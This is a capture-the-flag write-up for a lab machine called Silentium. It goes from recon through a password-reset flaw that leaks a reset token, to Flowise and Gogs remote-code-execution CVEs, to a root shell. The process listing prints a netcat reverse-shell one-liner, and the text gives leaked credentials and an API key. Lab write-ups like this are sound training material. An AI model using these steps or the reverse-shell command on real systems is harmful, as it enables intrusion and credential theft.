# Silentium

## Nmap scan:
```
Nmap scan report for silentium.htb (10.129.11.231)
Host is up (0.011s latency).
Not shown: 65533 closed tcp ports (reset)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
80/tcp open  http    nginx 1.24.0 (Ubuntu)
|_http-title: Silentium | Institutional Capital & Lending Solutions
|_http-server-header: nginx/1.24.0 (Ubuntu)
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

## Writeup:
Nmap (TCP) scan reveals two open ports:
- `80 HTTP`
- `22 ssh`
Nmap (UDP) scan reveals no open UDP ports.

The page served over port `80` is a simple static page, without anything super interesting.
The only notable content is the names of three individuals working at Silentium.
Those being:
- `Ben`
- `Marcus Thorne`
- `Elena Rossi`

I run a quick directory enumeration scan with `gobuster`, but this fails to reveal any interesting endpoints or directories.
Only a directory called:
- `assets`

Next I try subdomain/vhost enumeration using `ffuf`, which results in one hit:
- `staging.silentium.htb`.

Navigating to this subdomain, I'm presented with a simple login page.
Looking through the page, I see a forgot password option.
I decide to try and check if this is vulnerable.

Thus I open up Burp Suite.

Intercepting the request to send a reset password email, I see that the only data transmitted is the email of the user whose password should be reset. The data is sent in `json` format.
```
{"user":{"email":"email@example.com"}}
```
I decide to try guessing the email of an internal user, in this case Ben, whose name was on the main page.
Thus I send a password reset request containing the following:
```
{"user":{"ben@silentium.htb"}}
```
Upon receiving the response, I see that this endpoint makes a pretty dumb mistake.
The response contains the temporary token required to reset the password, along with a nice hash of the current password.

I reset the password of Ben, who in the response is also referred to as `admin`, and thus gain access to the internal flowise instance.

The version of flowise in use is `3.0.5`, which is vulnerable to `CVE-2025-59528`, allowing for authenticated remote code execution. I find an online PoC to exploit this (see submodule).

The RCE requires grabbing an `API` key. For the sake of convenience, I've placed it here.
API Key
- `hWp_8jB76zi0VtKSr2d9TfGK1fm6NuNPg1uA-8FsUJc`

This pops a reverse shell as the `root` user within a Docker container.
I don't find any flags, so I assume that I need to escape this Docker container.

I start by enumerating running processes:
```
    1 root      0:19 node /usr/local/bin/flowise start
  124 root      0:00 /bin/sh -c rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.10.15.217 9001 >/tmp/f
  127 root      0:00 cat /tmp/f
  128 root      0:00 /bin/sh -i
  129 root      0:00 nc 10.10.15.217 9001
  224 root      0:00 curl -f http://localhost:3000/api/v1/ping
```

Interesting is the `curl` command, which is contacting an internal service.
I also grab the `root` user's environment variables:
```
FLOWISE_PASSWORD=F1l3_d0ck3r
ALLOW_UNAUTHORIZED_CERTS=true
NODE_VERSION=20.19.4
HOSTNAME=c78c3cceb7ba
YARN_VERSION=1.22.22
SMTP_PORT=1025
SHLVL=3
PORT=3000
HOME=/root
OLDPWD=/bin
SENDER_EMAIL=ben@silentium.htb
PUPPETEER_EXECUTABLE_PATH=/usr/bin/chromium-browser
JWT_ISSUER=ISSUER
JWT_AUTH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
LLM_PROVIDER=nvidia-nim
SMTP_USERNAME=test
SMTP_SECURE=false
JWT_REFRESH_TOKEN_EXPIRY_IN_MINUTES=43200
FLOWISE_USERNAME=ben
PATH=/usr/local/sbin:/usr/local/bin:/usr/sbin:/usr/bin:/sbin:/bin
DATABASE_PATH=/root/.flowise
JWT_TOKEN_EXPIRY_IN_MINUTES=360
JWT_AUDIENCE=AUDIENCE
SECRETKEY_PATH=/root/.flowise
PWD=/
SMTP_PASSWORD=r04D!!_R4ge
NVIDIA_NIM_LLM_MODE=managed
SMTP_HOST=mailhog
JWT_REFRESH_TOKEN_SECRET=AABBCCDDAABBCCDDAABBCCDDAABBCCDDAABBCCDD
SMTP_USER=test
```

Looking through the environment variables, I notice two credentials, these being:
- `FLOWISE_PASSWORD=F1l3_d0ck3r`
- `SMTP_PASSWORD=r04D!!_R4ge`
I try both of these while attempting to authenticate as `ben` over `ssh` to `silentium.htb`.
The second works, and thus we have valid credentials:
- `ben@silentium.htb:r04D!!_R4ge`

Upon successful authentication we find the `user.txt` flag waiting for us!
I notice some nice internal ports open, so I use proxy nmap through `ssh` and do a quick scan:
```
PORT      STATE  SERVICE VERSION
22/tcp    open   ssh     OpenSSH 9.6p1 Ubuntu 3ubuntu13.15 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   256 0c:4b:d2:76:ab:10:06:92:05:dc:f7:55:94:7f:18:df (ECDSA)
|_  256 2d:6d:4a:4c:ee:2e:11:b6:c8:90:e6:83:e9:df:38:b0 (ED25519)
53/tcp    closed domain
80/tcp    open   http    nginx 1.24.0 (Ubuntu)
|_http-server-header: nginx/1.24.0 (Ubuntu)
|_http-title: Did not follow redirect to http://silentium.htb/
1025/tcp  open   smtp    MailHog smtpd
|_smtp-commands: Hello localhost, PIPELINING, AUTH PLAIN
3000/tcp  open   ppp?
3001/tcp  open   http    Golang net/http server
| fingerprint-strings: 
|   GenericLines, Help, RTSPRequest: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest: 
|     HTTP/1.0 200 OK
|     Content-Type: text/html; charset=UTF-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     Set-Cookie: i_like_gogs=555070ff7b2a7635; Path=/; HttpOnly
|     Set-Cookie: _csrf=vZx4WugO2n5k1I9hVb66mUGd6pY6MTc4MTA4OTMwNDEwNzY1MTU2NA; Path=/; Domain=staging-v2-code.dev.silentium.htb; Expires=Thu, 11 Jun 2026 11:01:44 GMT; HttpOnly
|     X-Content-Type-Options: nosniff
|     X-Frame-Options: deny
|     Date: Wed, 10 Jun 2026 11:01:44 GMT
|     <!DOCTYPE html>
|     <html>
|     <head data-suburl="">
|     <meta http-equiv="Content-Type" content="text/html; charset=UTF-8" />
|     <meta http-equiv="X-UA-Compatible" content="IE=edge"/>
|     <meta name="author" content="Gogs" />
|     <meta name="description" content="Gogs is a painless self-hosted Git service" />
|     <meta name="keywords" content="go, git, self-hosted, gogs">
|     <meta name="referrer" content="no-referrer" />
|     <meta name="_csrf" content="vZx4WugO2n5k1I9hVb66mUGd6
|   HTTPOptions: 
|     HTTP/1.0 500 Internal Server Error
|     Content-Type: text/plain; charset=utf-8
|     Set-Cookie: lang=en-US; Path=/; Max-Age=2147483647
|     X-Content-Type-Options: nosniff
|     Date: Wed, 10 Jun 2026 11:01:44 GMT
|     Content-Length: 108
|_    template: base/footer:15:47: executing "base/footer" at <.PageStartTime>: invalid value; expected time.Time
|_http-title: Gogs
8025/tcp  open   http    Golang net/http server (Go-IPFS json-rpc or InfluxDB API)
|_http-title: MailHog
34855/tcp open   http    Golang net/http server
|_http-title: Site doesn't have a title (text/plain; charset=utf-8).
| fingerprint-strings: 
|   FourOhFourRequest: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 10 Jun 2026 11:01:54 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   GenericLines, Help, LPDString, RTSPRequest, SIPOptions, SSLSessionReq, Socks5: 
|     HTTP/1.1 400 Bad Request
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|     Request
|   GetRequest, HTTPOptions: 
|     HTTP/1.0 404 Not Found
|     Date: Wed, 10 Jun 2026 11:01:39 GMT
|     Content-Length: 19
|     Content-Type: text/plain; charset=utf-8
|     404: Page Not Found
|   OfficeScan: 
|     HTTP/1.1 400 Bad Request: missing required Host header
|     Content-Type: text/plain; charset=utf-8
|     Connection: close
|_    Request: missing required Host header
```

On port `3001` it looks like an internal git service is running.
I decide to enumerate this through the browser using my `socks` proxy.
I use firefox, and in order to access `localhost` services through a proxy you need to set the following flag in about:config to true:
- `network.proxy.allow_hijacking_localhost`
Then I can make use of my proxy with foxyproxy and access the internal service.
The internal service is a `gogs` git interface.
Looking for vulnerabilities, I see that it has quite the history of weaknesses allowing for `RCE`.
I can't find the exact version number, but I decide to try `CVE-2025-8110` (see submodule).

In order to exploit this, I need to be authenticated. Testing credential reuse for user `ben` fails to produce any results, so I register a new user with the username `Username`.

The exploit I use has a few quirks. 
First I need to fix a problem on line `129`, where a tab has been used instead of spaces causing a python error.
Afterwards I modify the user which has been hardcoded into the script from `pwnuser` to `Username`, which is the user I had made earlier.
After that I had to generate an application token from the `gogs` interface as `Username`, and paste that into the `token` variable on line `54`.

```
52: username = "Username"
53: useremail = f"{username}@test.com"
54: token = "fbf3a36fb1013ed020396383e160c8f75b6b7016" # You can find yours in your Gogs website Settings -> Applications -> Generate new token
```

Then I actived my listener, running from my session as `ben` on the victim host, not from my attacker machine.
Thus:
- `ben@silentium:~$ nc -lvnp 9001`

After that I could run the script as so:
- `proxychains -q python3 CVE-2025-8110-RCE.py -u 'http://localhost:3001' -lh 127.0.0.1 -lp 9001 -p 'Password123'`

This proceded to pop a nice `root` shell, where the `root.txt` flag was waiting for me in the `/root/` directory :D
